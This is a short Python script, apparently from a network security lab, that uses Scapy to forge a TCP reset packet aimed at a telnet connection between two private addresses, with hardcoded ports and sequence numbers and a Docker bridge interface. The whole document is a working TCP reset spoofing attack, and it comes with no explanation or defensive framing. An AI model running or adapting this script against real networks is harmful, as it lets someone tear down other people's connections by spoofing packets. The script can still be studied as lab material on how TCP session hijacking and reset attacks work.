#!/usr/bin/env python3
from scapy.all import *
conf.L3socket=L3RawSocket
ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=33822, dport=23, flags="R", seq=846643566, ack=3885584482)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0,iface='br-4b43672156a8')
